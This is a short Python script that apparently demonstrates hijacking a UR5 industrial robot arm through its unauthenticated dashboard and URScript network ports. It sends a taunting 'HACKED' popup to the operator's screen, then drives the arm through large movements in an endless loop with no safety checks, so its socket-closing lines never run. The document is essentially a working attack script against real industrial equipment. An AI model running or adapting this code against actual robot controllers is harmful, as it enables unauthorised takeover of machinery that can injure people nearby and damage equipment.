# Open and close a popup in the UR5 GUI via 2 ports
# Useful resources
# http://www.zacobria.com/universal-robots-zacobria-forum-hints-tips-how-to/script-via-socket-connection/
# https://www.universal-robots.com/how-tos-and-faqs/how-to/ur-how-tos/dashboard-server-cb-series-port-29999-15690/

import socket
import time

# initialise variables
UR5Controller = "192.168.0.7"    # IP address of UR5 Controller
DASHBOARD_PORT = 29999  # Port to interface via DashBoard server
GENERAL_PORT = 30002    # Port to interface via URScript API & normal python code

# initialise sockets
dashboardSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
generalSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# AF_INET stands for address family, using Internet Protocol 4
# SOCK_STREAM indicates the type of socket (in this case, it's TCP), as opposed to SOCK_DGRAM (UDP)

# connect to UR5 Controller via 2 ports
dashboardSocket.connect((UR5Controller, DASHBOARD_PORT))
generalSocket.connect((UR5Controller, GENERAL_PORT))
data = dashboardSocket.recv(256)
print(data)

#  Open popup, you're hacked
generalSocket.send("popup(\"HACKED\", title=\"HAHAHAHA\", warning=True, error=False)" + "\n")
time.sleep(1)

#  initialise robot movement
print("MidPos")
generalSocket.send("movej(p[-0.02636,-0.18756,0.53613,0,0,0.812],a=1.2,v=1,r=0)" + "\n")
time.sleep(5)

while 1:
    #  move left
    print("Move Left")
    generalSocket.send("movej(p[-0.13776,0.01691,0.46656,0.0649,-0.0398,-0.4431],a=1.2,v=1,r=0)" + "\n")
    time.sleep(2.5)

    #  move right
    print("Move Right")
    generalSocket.send("movej(p[-0.04463,0.11323,0.69341,4.0165,-2.4579,2.7093],a=1.2,v=1,r=0)" + "\n")
    time.sleep(2)

# close socket connection
dashboardSocket.close()
generalSocket.close()

print("End of program")
